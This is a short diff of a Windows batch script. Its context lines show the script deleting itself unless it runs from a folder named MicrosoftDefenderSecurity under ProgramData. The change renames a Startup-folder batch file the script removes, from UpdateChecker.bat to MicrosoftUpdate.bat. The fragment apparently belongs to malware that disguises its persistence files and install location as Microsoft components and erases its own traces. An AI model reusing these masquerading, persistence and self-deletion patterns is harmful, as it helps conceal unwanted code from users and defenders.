@@ -131,8 +131,8 @@ if %~dp0 NEQ %PROGRAMDATA%\MicrosoftDefenderSecurity\ (
 del /f /q %~f0
 ))))
 
-if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/UpdateChecker.bat" (
-del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.bat"
+if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.bat" (
+del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.bat"
 )
 
 exit
